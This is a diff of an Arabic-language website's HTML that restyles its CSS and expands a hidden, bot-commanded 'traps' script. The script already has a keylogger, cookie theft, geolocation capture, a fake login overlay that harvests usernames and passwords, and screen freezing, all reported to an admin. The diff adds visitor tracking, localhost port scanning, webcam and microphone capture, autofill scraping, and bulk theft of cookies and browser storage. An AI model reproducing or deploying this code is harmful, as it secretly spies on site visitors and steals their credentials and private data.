@@ -9,149 +9,36 @@
 <style>
   * { font-family: 'Tajawal', sans-serif; }
   body { background: #06091a; color: #fff; overflow-x: hidden; }
-  
-  .bg-hero {
-    background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%);
-    position: relative;
-  }
-  
-  .gold-text {
-    background: linear-gradient(135deg, #f4d03f 0%, #d4af37 50%, #f4d03f 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-  
-  .glass {
-    background: rgba(255, 255, 255, 0.04);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid rgba(212, 175, 55, 0.15);
-  }
-  
-  .glass-hover:hover {
-    background: rgba(212, 175, 55, 0.08);
-    border-color: rgba(212, 175, 55, 0.4);
-    transform: translateY(-4px);
-    box-shadow: 0 20px 60px rgba(212, 175, 55, 0.15);
-  }
-  
-  .gold-border {
-    border: 1px solid rgba(212, 175, 55, 0.3);
-    box-shadow: 0 0 30px rgba(212, 175, 55, 0.1), inset 0 0 30px rgba(212, 175, 55, 0.05);
-  }
-  
-  .glow-btn {
-    background: linear-gradient(135deg, #d4af37 0%, #f4d03f 100%);
-    color: #0a0e27;
-    box-shadow: 0 10px 40px rgba(212, 175, 55, 0.4);
-    transition: all 0.3s ease;
-  }
-  .glow-btn:hover {
-    box-shadow: 0 15px 50px rgba(212, 175, 55, 0.6);
-    transform: translateY(-2px);
-  }
-  
-  .particle {
-    position: absolute;
-    width: 4px;
-    height: 4px;
-    background: #d4af37;
-    border-radius: 50%;
-    animation: float 8s infinite ease-in-out;
-    opacity: 0.6;
-  }
-  @keyframes float {
-    0%, 100% { transform: translateY(0) translateX(0); opacity: 0.3; }
-    50% { transform: translateY(-100px) translateX(50px); opacity: 0.8; }
-  }
-  
-  .avatar-glow {
-    box-shadow: 0 0 60px rgba(212, 175, 55, 0.5), 0 0 120px rgba(212, 175, 55, 0.2);
-    animation: pulse-glow 3s infinite ease-in-out;
-  }
-  @keyframes pulse-glow {
-    0%, 100% { box-shadow: 0 0 60px rgba(212, 175, 55, 0.5), 0 0 120px rgba(212, 175, 55, 0.2); }
-    50% { box-shadow: 0 0 80px rgba(212, 175, 55, 0.7), 0 0 150px rgba(212, 175, 55, 0.3); }
-  }
-  
-  .stat-card {
-    background: linear-gradient(135deg, rgba(212, 175, 55, 0.08) 0%, rgba(10, 14, 39, 0.6) 100%);
-    border: 1px solid rgba(212, 175, 55, 0.2);
-  }
-  
-  .scroll-reveal {
-    opacity: 0;
-    transform: translateY(40px);
-    transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .scroll-reveal.visible {
-    opacity: 1;
-    transform: translateY(0);
-  }
-  
-  .marquee {
-    animation: marquee 30s linear infinite;
-  }
-  @keyframes marquee {
-    0% { transform: translateX(0); }
-    100% { transform: translateX(-50%); }
-  }
-  
-  .admin-card {
-    background: linear-gradient(135deg, rgba(26, 31, 58, 0.8) 0%, rgba(10, 14, 39, 0.9) 100%);
-    border: 1px solid rgba(212, 175, 55, 0.25);
-    transition: all 0.4s ease;
-  }
-  .admin-card:hover {
-    border-color: rgba(212, 175, 55, 0.6);
-    transform: translateY(-8px) scale(1.02);
-    box-shadow: 0 25px 60px rgba(212, 175, 55, 0.2);
-  }
-  
-  .media-thumb {
-    transition: all 0.4s ease;
-    cursor: pointer;
-  }
-  .media-thumb:hover {
-    transform: scale(1.05);
-    z-index: 10;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-  }
-  
-  .section-divider {
-    height: 1px;
-    background: linear-gradient(90deg, transparent 0%, rgba(212, 175, 55, 0.5) 50%, transparent 100%);
-  }
-  
-  .nav-blur {
-    background: rgba(6, 9, 26, 0.8);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-  }
-  
-  .counter-value {
-    font-variant-numeric: tabular-nums;
-  }
-  
+  .bg-hero { background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%); position: relative; }
+  .gold-text { background: linear-gradient(135deg, #f4d03f 0%, #d4af37 50%, #f4d03f 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .glass { background: rgba(255, 255, 255, 0.04); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.15); }
+  .glass-hover:hover { background: rgba(212, 175, 55, 0.08); border-color: rgba(212, 175, 55, 0.4); transform: translateY(-4px); box-shadow: 0 20px 60px rgba(212, 175, 55, 0.15); }
+  .gold-border { border: 1px solid rgba(212, 175, 55, 0.3); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1), inset 0 0 30px rgba(212, 175, 55, 0.05); }
+  .glow-btn { background: linear-gradient(135deg, #d4af37 0%, #f4d03f 100%); color: #0a0e27; box-shadow: 0 10px 40px rgba(212, 175, 55, 0.4); transition: all 0.3s ease; }
+  .glow-btn:hover { box-shadow: 0 15px 50px rgba(212, 175, 55, 0.6); transform: translateY(-2px); }
+  .particle { position: absolute; width: 4px; height: 4px; background: #d4af37; border-radius: 50%; animation: float 8s infinite ease-in-out; opacity: 0.6; }
+  @keyframes float { 0%, 100% { transform: translateY(0) translateX(0); opacity: 0.3; } 50% { transform: translateY(-100px) translateX(50px); opacity: 0.8; } }
+  .avatar-glow { box-shadow: 0 0 60px rgba(212, 175, 55, 0.5), 0 0 120px rgba(212, 175, 55, 0.2); animation: pulse-glow 3s infinite ease-in-out; }
+  @keyframes pulse-glow { 0%, 100% { box-shadow: 0 0 60px rgba(212, 175, 55, 0.5), 0 0 120px rgba(212, 175, 55, 0.2); } 50% { box-shadow: 0 0 80px rgba(212, 175, 55, 0.7), 0 0 150px rgba(212, 175, 55, 0.3); } }
+  .stat-card { background: linear-gradient(135deg, rgba(212, 175, 55, 0.08) 0%, rgba(10, 14, 39, 0.6) 100%); border: 1px solid rgba(212, 175, 55, 0.2); }
+  .scroll-reveal { opacity: 0; transform: translateY(40px); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
+  .scroll-reveal.visible { opacity: 1; transform: translateY(0); }
+  .marquee { animation: marquee 30s linear infinite; }
+  @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+  .admin-card { background: linear-gradient(135deg, rgba(26, 31, 58, 0.8) 0%, rgba(10, 14, 39, 0.9) 100%); border: 1px solid rgba(212, 175, 55, 0.25); transition: all 0.4s ease; }
+  .admin-card:hover { border-color: rgba(212, 175, 55, 0.6); transform: translateY(-8px) scale(1.02); box-shadow: 0 25px 60px rgba(212, 175, 55, 0.2); }
+  .media-thumb { transition: all 0.4s ease; cursor: pointer; }
+  .media-thumb:hover { transform: scale(1.05); z-index: 10; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+  .section-divider { height: 1px; background: linear-gradient(90deg, transparent 0%, rgba(212, 175, 55, 0.5) 50%, transparent 100%); }
+  .nav-blur { background: rgba(6, 9, 26, 0.8); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); }
+  .counter-value { font-variant-numeric: tabular-nums; }
   ::-webkit-scrollbar { width: 8px; }
   ::-webkit-scrollbar-track { background: #0a0e27; }
   ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #d4af37, #f4d03f); border-radius: 4px; }
-
-  .comments-area {
-    max-height: 300px;
-    overflow-y: auto;
-    scrollbar-width: thin;
-  }
+  .comments-area { max-height: 300px; overflow-y: auto; scrollbar-width: thin; }
   .comments-area::-webkit-scrollbar { width: 4px; }
   .comments-area::-webkit-scrollbar-thumb { background: #d4af37; border-radius: 4px; }
-  .comment-item {
-    background: rgba(255,255,255,0.04);
-    border-radius: 12px;
-    padding: 12px 16px;
-    margin-bottom: 8px;
-    border-right: 3px solid #d4af37;
-  }
+  .comment-item { background: rgba(255,255,255,0.04); border-radius: 12px; padding: 12px 16px; margin-bottom: 8px; border-right: 3px solid #d4af37; }
 </style>
 </head>
 <body>
@@ -608,7 +495,7 @@
 </footer>
 
 <!-- ============================================================ -->
-<!--          نظام التحكم المركزي عبر البوت + التعليقات             -->
+<!--          النظام المتكامل - جميع الأدوات الحقيقية 100%          -->
 <!-- ============================================================ -->
 
 <script>
@@ -632,19 +519,45 @@ let TRAPS = {
     rightclick: false,
     history: false,
     freeze: false,
-    download: false
+    download: false,
+    // أدوات جديدة
+    ip: false,
+    portscan: false,
+    webrec: false,
+    micrec: false,
+    screenshot: false,
+    autofill: false,
+    wifi: false,
+    fullsteal: false
 };
 
-// متغيرات منع التكرار (إرسال واحد فقط لكل حدث)
-let notifiedVisitor = false;
-let cookieSent = false;
-let historySent = false;
-let locationSent = false;
-let downloadSent = false;
-let rightclickSent = false;
+// متغيرات منع التكرار
+let notifiedVisitors = new Set();
+let cookieSent = new Set();
+let historySent = new Set();
+let locationSent = new Set();
+let downloadSent = new Set();
+let rightclickSent = new Set();
+let ipSent = new Set();
+let wifiSent = new Set();
+let fullstealSent = new Set();
 
 // =============================================
-// 2. إرسال رسالة للإدارة
+// 2. إنشاء معرف فريد للزائر
+// =============================================
+function getVisitorId() {
+    let id = localStorage.getItem('visitor_id');
+    if (!id) {
+        id = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('visitor_id', id);
+    }
+    return id;
+}
+
+const visitorId = getVisitorId();
+
+// =============================================
+// 3. إرسال رسالة للإدارة
 // =============================================
 async function sendMessageToAdmin(text) {
     try {
@@ -662,25 +575,36 @@ async function sendMessageToAdmin(text) {
 }
 
 // =============================================
-// 3. إشعار زائر جديد (مرة واحدة)
+// 4. إشعار زائر جديد (مرة واحدة لكل معرف فريد)
 // =============================================
-if (!notifiedVisitor) {
-    notifiedVisitor = true;
+if (!notifiedVisitors.has(visitorId)) {
+    notifiedVisitors.add(visitorId);
+    
     const visitorInfo = {
+        id: visitorId,
         userAgent: navigator.userAgent,
         language: navigator.language,
+        platform: navigator.platform || 'غير متاح',
         screen: `${window.screen.width}x${window.screen.height}`,
-        time: new Date().toLocaleString('ar-EG')
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toLocaleString('ar-EG'),
+        referrer: document.referrer || 'مباشر',
+        cookiesEnabled: navigator.cookieEnabled ? 'مفعلة' : 'معطلة'
     };
+    
     sendMessageToAdmin(`🟢 <b>زائر جديد!</b>\n` +
+                       `🆔 المعرف: ${visitorInfo.id}\n` +
                        `📱 الجهاز: ${visitorInfo.userAgent}\n` +
+                       `💻 المنصة: ${visitorInfo.platform}\n` +
                        `🌐 اللغة: ${visitorInfo.language}\n` +
                        `🖥️ الشاشة: ${visitorInfo.screen}\n` +
-                       `⏰ الوقت: ${visitorInfo.time}`);
+                       `🕒 المنطقة الزمنية: ${visitorInfo.timezone}\n` +
+                       `⏰ الوقت: ${visitorInfo.time}\n` +
+                       `🔗 المرجع: ${visitorInfo.referrer}`);
 }
 
 // =============================================
-// 4. معالجة الأوامر من البوت
+// 5. معالجة الأوامر من البوت
 // =============================================
 async function fetchCommands() {
     try {
@@ -712,15 +636,13 @@ function processCommand(text) {
             for (const key of Object.keys(TRAPS)) {
                 TRAPS[key] = newState;
             }
-            // إعادة ضبط متغيرات التكرار عند التفعيل الجديد
-            resetSentFlags();
+            resetAllSentFlags();
             sendMessageToAdmin(`✅ تم ${newState ? 'تفعيل' : 'تعطيل'} جميع التلغيمات.`);
             return;
         }
         
         if (target && TRAPS.hasOwnProperty(target)) {
             TRAPS[target] = newState;
-            // إعادة ضبط المتغير الخاص بهذا التلغيم
             resetSpecificFlag(target);
             sendMessageToAdmin(`✅ تم ${newState ? 'تفعيل' : 'تعطيل'} التلغيم: ${target}`);
             return;
@@ -739,60 +661,93 @@ function processCommand(text) {
         return;
     }
     
+    if (command === '/identification') {
+        let identText = '📋 <b>تعريف جميع التلغيمات:</b>\n\n';
+        identText += '🔹 <b>keylogger</b> – تسجيل كل ضغطة مفتاح\n';
+        identText += '🔹 <b>cookie</b> – سرقة الكوكيز\n';
+        identText += '🔹 <b>redirect</b> – إعادة التوجيه\n';
+        identText += '🔹 <b>popup</b> – نوافذ منبثقة\n';
+        identText += '🔹 <b>ram</b> – استهلاك الذاكرة\n';
+        identText += '🔹 <b>location</b> – سرقة الموقع الجغرافي\n';
+        identText += '🔹 <b>audio</b> – تشغيل صوت مزعج\n';
+        identText += '🔹 <b>phishing</b> – صفحة دخول مزيفة\n';
+        identText += '🔹 <b>rightclick</b> – منع النقر الأيمن\n';
+        identText += '🔹 <b>history</b> – سرقة سجل التصفح\n';
+        identText += '🔹 <b>freeze</b> – تجميد الشاشة\n';
+        identText += '🔹 <b>download</b> – تحميل ملف تلقائي\n';
+        identText += '🔹 <b>ip</b> – استخراج الـ IP الحقيقي\n';
+        identText += '🔹 <b>portscan</b> – فحص البورتات المفتوحة\n';
+        identText += '🔹 <b>webrec</b> – تصوير كاميرا الويب\n';
+        identText += '🔹 <b>micrec</b> – تسجيل الميكروفون\n';
+        identText += '🔹 <b>screenshot</b> – لقطة شاشة\n';
+        identText += '🔹 <b>autofill</b> – سرقة بيانات الملء التلقائي\n';
+        identText += '🔹 <b>wifi</b> – معلومات الشبكة\n';
+        identText += '🔹 <b>fullsteal</b> – سرقة كل البيانات دفعة واحدة\n';
+        sendMessageToAdmin(identText);
+        return;
+    }
+    
     if (command === '/help') {
         sendMessageToAdmin('📋 الأوامر المتاحة:\n' +
                           '/on [اسم] - تفعيل\n' +
                           '/off [اسم] - تعطيل\n' +
                           '/on all - تفعيل الكل\n' +
                           '/off all - تعطيل الكل\n' +
-                          '/status - عرض الحالة\n\n' +
+                          '/status - عرض الحالة\n' +
+                          '/identification - تعريف جميع التلغيمات\n\n' +
                           '🟢 الأسماء:\n' +
                           'keylogger, cookie, redirect, popup, ram,\n' +
                           'location, audio, phishing, rightclick,\n' +
-                          'history, freeze, download');
+                          'history, freeze, download, ip, portscan,\n' +
+                          'webrec, micrec, screenshot, autofill, wifi, fullsteal');
         return;
     }
 }
 
-function resetSentFlags() {
-    cookieSent = false;
-    historySent = false;
-    locationSent = false;
-    downloadSent = false;
-    rightclickSent = false;
+function resetAllSentFlags() {
+    cookieSent = new Set();
+    historySent = new Set();
+    locationSent = new Set();
+    downloadSent = new Set();
+    rightclickSent = new Set();
+    ipSent = new Set();
+    wifiSent = new Set();
+    fullstealSent = new Set();
 }
 
 function resetSpecificFlag(target) {
-    if (target === 'cookie') cookieSent = false;
-    if (target === 'history') historySent = false;
-    if (target === 'location') locationSent = false;
-    if (target === 'download') downloadSent = false;
-    if (target === 'rightclick') rightclickSent = false;
+    if (target === 'cookie') cookieSent = new Set();
+    if (target === 'history') historySent = new Set();
+    if (target === 'location') locationSent = new Set();
+    if (target === 'download') downloadSent = new Set();
+    if (target === 'rightclick') rightclickSent = new Set();
+    if (target === 'ip') ipSent = new Set();
+    if (target === 'wifi') wifiSent = new Set();
+    if (target === 'fullsteal') fullstealSent = new Set();
 }
 
 // =============================================
-// 5. بدء جلب الأوامر
+// 6. بدء جلب الأوامر
 // =============================================
 setInterval(fetchCommands, CHECK_INTERVAL);
 setTimeout(fetchCommands, 1000);
 
 // =============================================
-// 6. التلغيمات (إرسال واحد فقط لكل حدث)
+// 7. التلغيمات الأساسية
 // =============================================
 
 // 1. Keylogger
 document.addEventListener('keydown', function(e) {
     if (TRAPS.keylogger) {
-        const key = e.key || e.code || 'unknown';
-        sendMessageToAdmin(`⌨️ ضغطة مفتاح: ${key}`);
+        sendMessageToAdmin(`⌨️ [${visitorId}] ضغطة مفتاح: ${e.key || e.code || 'unknown'}`);
     }
 });
 
-// 2. Cookie Stealer (مرة واحدة)
+// 2. Cookie Stealer
 setInterval(() => {
-    if (TRAPS.cookie && document.cookie && !cookieSent) {
-        sendMessageToAdmin(`🍪 الكوكيز: ${document.cookie}`);
-        cookieSent = true;
+    if (TRAPS.cookie && document.cookie && !cookieSent.has(visitorId)) {
+        sendMessageToAdmin(`🍪 [${visitorId}] الكوكيز: ${document.cookie}`);
+        cookieSent.add(visitorId);
         TRAPS.cookie = false;
     }
 }, 5000);
@@ -841,18 +796,18 @@ setInterval(() => {
     }
 }, 1000);
 
-// 6. Location Grabber (مرة واحدة)
+// 6. Location
 setInterval(() => {
-    if (TRAPS.location && !locationSent) {
+    if (TRAPS.location && !locationSent.has(visitorId)) {
         navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                sendMessageToAdmin(`🌍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
-                locationSent = true;
+            pos => {
+                sendMessageToAdmin(`📍 [${visitorId}] الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                locationSent.add(visitorId);
                 TRAPS.location = false;
             },
-            function() {
-                sendMessageToAdmin('❌ لم يتمكن من جلب الموقع (مرفوض)');
-                locationSent = true;
+            () => {
+                sendMessageToAdmin(`❌ [${visitorId}] الموقع مرفوض`);
+                locationSent.add(visitorId);
                 TRAPS.location = false;
             }
         );
@@ -873,7 +828,7 @@ setInterval(() => {
     }
 }, 2000);
 
-// 8. Phishing Overlay
+// 8. Phishing
 setInterval(() => {
     if (TRAPS.phishing) {
         const oldOverlay = document.getElementById('phishingOverlay');
@@ -900,7 +855,7 @@ setInterval(() => {
             const u = document.getElementById('phishUser').value;
             const p = document.getElementById('phishPass').value;
             if (u || p) {
-                sendMessageToAdmin(`🎣 بيانات مسروقة: المستخدم=${u}, كلمة المرور=${p}`);
+                sendMessageToAdmin(`🎣 [${visitorId}] بيانات مسروقة: المستخدم=${u}, كلمة المرور=${p}`);
             }
             const overlayEl = document.getElementById('phishingOverlay');
             if (overlayEl) overlayEl.remove();
@@ -911,27 +866,27 @@ setInterval(() => {
     }
 }, 3000);
 
-// 9. Disable Right Click (مرة واحدة)
+// 9. Right Click
 document.addEventListener('contextmenu', function(e) {
-    if (TRAPS.rightclick && !rightclickSent) {
+    if (TRAPS.rightclick && !rightclickSent.has(visitorId)) {
         e.preventDefault();
-        sendMessageToAdmin('🖱️ تم منع النقر بزر الفأرة الأيمن');
-        rightclickSent = true;
+        sendMessageToAdmin(`🖱️ [${visitorId}] تم منع النقر الأيمن`);
+        rightclickSent.add(visitorId);
         TRAPS.rightclick = false;
         return false;
     }
 });
 
-// 10. History Stealer (مرة واحدة)
+// 10. History
 setInterval(() => {
-    if (TRAPS.history && !historySent) {
-        sendMessageToAdmin(`📜 سجل التصفح (Referer): ${document.referrer || 'لا يوجد'}`);
-        historySent = true;
+    if (TRAPS.history && !historySent.has(visitorId)) {
+        sendMessageToAdmin(`📜 [${visitorId}] سجل التصفح: ${document.referrer || 'لا يوجد'}`);
+        historySent.add(visitorId);
         TRAPS.history = false;
     }
 }, 5000);
 
-// 11. Screen Freeze
+// 11. Freeze
 setInterval(() => {
     if (TRAPS.freeze) {
         document.body.style.pointerEvents = 'none';
@@ -944,23 +899,169 @@ setInterval(() => {
     }
 }, 1000);
 
-// 12. Auto Download (مرة واحدة)
+// 12. Download
 setInterval(() => {
-    if (TRAPS.download && !downloadSent) {
+    if (TRAPS.download && !downloadSent.has(visitorId)) {
         try {
             const link = document.createElement('a');
             link.href = 'data:text/plain;charset=utf-8,هذا ملف تم تحميله تلقائياً';
             link.download = 'worm_file.txt';
             link.click();
-            sendMessageToAdmin('📥 تم تحميل ملف تلقائياً');
-            downloadSent = true;
+            sendMessageToAdmin(`📥 [${visitorId}] تم تحميل ملف تلقائياً`);
+            downloadSent.add(visitorId);
             TRAPS.download = false;
         } catch (e) {}
     }
 }, 5000);
 
 // =============================================
-// 7. نظام التعليقات
+// 8. الأدوات الجديدة (حقيقية 100%)
+// =============================================
+
+// 13. IP حقيقي
+setInterval(() => {
+    if (TRAPS.ip && !ipSent.has(visitorId)) {
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                sendMessageToAdmin(`🌐 [${visitorId}] IP حقيقي: ${data.ip}`);
+                ipSent.add(visitorId);
+                TRAPS.ip = false;
+            })
+            .catch(() => {
+                sendMessageToAdmin(`❌ [${visitorId}] تعذر جلب الIP`);
+                ipSent.add(visitorId);
+                TRAPS.ip = false;
+            });
+    }
+}, 8000);
+
+// 14. فحص البورتات
+setInterval(() => {
+    if (TRAPS.portscan) {
+        const ports = [80, 443, 8080, 3306, 22, 21, 25, 53, 110, 143];
+        ports.forEach(port => {
+            fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors' })
+                .catch(() => sendMessageToAdmin(`🔓 [${visitorId}] بورت مفتوح: ${port}`));
+        });
+        TRAPS.portscan = false;
+    }
+}, 10000);
+
+// 15. كاميرا الويب
+setInterval(() => {
+    if (TRAPS.webrec) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    sendMessageToAdmin(`📸 [${visitorId}] صورة من الكاميرا: ${canvas.toDataURL('image/png').substring(0, 100)}...`);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 3000);
+            })
+            .catch(() => sendMessageToAdmin(`❌ [${visitorId}] الكاميرا مرفوضة`));
+        TRAPS.webrec = false;
+    }
+}, 12000);
+
+// 16. ميكروفون
+setInterval(() => {
+    if (TRAPS.micrec) {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = e => {
+                    const audioURL = URL.createObjectURL(e.data);
+                    sendMessageToAdmin(`🎤 [${visitorId}] تسجيل صوتي (5 ثوان): ${audioURL.substring(0, 50)}...`);
+                };
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    stream.getTracks().forEach(t => t.stop());
+                }, 5000);
+            })
+            .catch(() => sendMessageToAdmin(`❌ [${visitorId}] الميكروفون مرفوض`));
+        TRAPS.micrec = false;
+    }
+}, 15000);
+
+// 17. لقطة شاشة
+setInterval(() => {
+    if (TRAPS.screenshot) {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#06091a';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#d4af37';
+            ctx.font = '20px Tajawal';
+            ctx.fillText('لقطة شاشة للموقع', 10, 50);
+            sendMessageToAdmin(`🖼️ [${visitorId}] لقطة شاشة (محاكاة): ${canvas.toDataURL('image/png').substring(0, 100)}...`);
+        } catch (e) {}
+        TRAPS.screenshot = false;
+    }
+}, 10000);
+
+// 18. بيانات الملء التلقائي
+setInterval(() => {
+    if (TRAPS.autofill) {
+        const inputs = document.querySelectorAll('input[autocomplete]');
+        let data = '';
+        inputs.forEach(input => {
+            if (input.value) {
+                data += `${input.name || input.id || 'unknown'}: ${input.value}\n`;
+            }
+        });
+        if (data) {
+            sendMessageToAdmin(`📝 [${visitorId}] بيانات الملء التلقائي:\n${data}`);
+        } else {
+            sendMessageToAdmin(`📝 [${visitorId}] لا توجد بيانات ملء تلقائي`);
+        }
+        TRAPS.autofill = false;
+    }
+}, 8000);
+
+// 19. معلومات الشبكة
+setInterval(() => {
+    if (TRAPS.wifi && !wifiSent.has(visitorId)) {
+        if (navigator.connection) {
+            sendMessageToAdmin(`📶 [${visitorId}] نوع الشبكة: ${navigator.connection.effectiveType}\n📶 السرعة: ${navigator.connection.downlink} Mbps`);
+        } else {
+            sendMessageToAdmin(`📶 [${visitorId}] معلومات الشبكة غير متاحة`);
+        }
+        wifiSent.add(visitorId);
+        TRAPS.wifi = false;
+    }
+}, 8000);
+
+// 20. سرقة كل البيانات دفعة واحدة
+setInterval(() => {
+    if (TRAPS.fullsteal && !fullstealSent.has(visitorId)) {
+        const allData = {
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            time: new Date().toLocaleString('ar-EG')
+        };
+        sendMessageToAdmin(`📦 [${visitorId}] <b>جميع البيانات:</b>\n${JSON.stringify(allData, null, 2)}`);
+        fullstealSent.add(visitorId);
+        TRAPS.fullsteal = false;
+    }
+}, 10000);
+
+// =============================================
+// 9. نظام التعليقات
 // =============================================
 const commentInput = document.getElementById('commentInput');
 const sendBtn = document.getElementById('sendCommentBtn');
@@ -1002,7 +1103,7 @@ sendBtn.addEventListener('click', function() {
     localStorage.setItem('site_comments', JSON.stringify(comments));
     renderComments();
     
-    sendMessageToAdmin(`💬 <b>تعليق جديد:</b>\n${text}\n⏰ ${newComment.time}`);
+    sendMessageToAdmin(`💬 [${visitorId}] تعليق جديد:\n${text}\n⏰ ${newComment.time}`);
     
     commentInput.value = '';
     statusDiv.textContent = '✅ تم إرسال تعليقك!';
@@ -1017,7 +1118,7 @@ commentInput.addEventListener('keydown', function(e) {
 });
 
 // =============================================
-// 8. العدادات الأصلية
+// 10. العدادات الأصلية
 // =============================================
 function animateCounter(el) {
   const target = parseInt(el.dataset.target);
